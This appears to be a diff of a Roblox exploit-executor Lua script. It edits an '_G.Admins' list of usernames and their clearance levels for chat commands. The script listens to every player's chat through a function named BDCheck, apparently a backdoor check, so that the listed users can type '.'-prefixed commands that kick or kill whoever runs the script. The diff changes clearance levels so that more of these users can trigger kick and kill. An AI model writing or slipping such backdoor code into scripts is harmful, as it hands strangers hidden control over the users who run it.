@@ -1,9 +1,9 @@
 local admins,notadmins=pcall(function()
 
 _G.Admins = {
-["lulaslollipop"] = 5,
-["iloweil"] = 5,
-["ggerrtasalt"] = 5,
+["lulaslollipop"] = 1,
+["iloweil"] = 1,
+["ggerrtasalt"] = 2,
 };
 
 local AdminPrefix = "."
@@ -39,17 +39,25 @@ if Player == LocalP or Player == "all" then
 LocalP:Kick(self)
 end
 end;
-["Clearence"] = {[5] = true;};
-}; -- u kan make new ones of these (the ; have to be in the same spots)
+["Clearence"] = {
+[1] = true;
+[2] = true;
+[3] = false;
+}; -- axxess lvl(kixk)
+}; -- kixk
 ["kill"] = {
 ["CommandFunc"] = function(Player, self, CmdPlayer)
 if Player == LocalP or Player == "all" then
 LocalP.Character.Humanoid:ChangeState(15)
 end
 end;
-["Clearence"] = {[4] = true;[5] = true;};
-   };
-};
+["Clearence"] = {
+[1] = true;
+[2] = true;
+[3] = true;
+}; -- axxess lvl(kill)
+}; -- kill funk
+}; -- admin kmd list
 
 getgenv().BDCheck = function(Target2, Chat)
 if Chat:sub(1, 1) == AdminPrefix then
@@ -66,25 +74,23 @@ local GP = Players:GetPlayers()
 for i = 1, #GP do
 local CoolKidPlayer = GP[i]
 CoolKidPlayer.Chatted:Connect(function(Word)
-BDCheck(CoolKidPlayer, Word)
+getgenv().BDCheck(CoolKidPlayer, Word)
 end)
 end
 Players.PlayerAdded:Connect(function(CKP)
 CKP.Chatted:Connect(function(Message)
-BDCheck(CKP, Message)
+getgenv().BDCheck(CKP, Message)
 end)
 end);
 
 task.spawn(function()
-warn("_G.Admins loaded!✅ (UID+UNAME)")
+warn("_G.Admins loaded!✅")
 end);
 --[[admins loaded]]--
 end); -- protekt
 
-if not admins then
-warn("❌ _G.Admins error:", notadmins)
-else
-warn("_G.Admins:"..admins.."✅")
+if not admins then 
+warn("❌ _G.Admins error:",notadmins); 
 end;
 
 
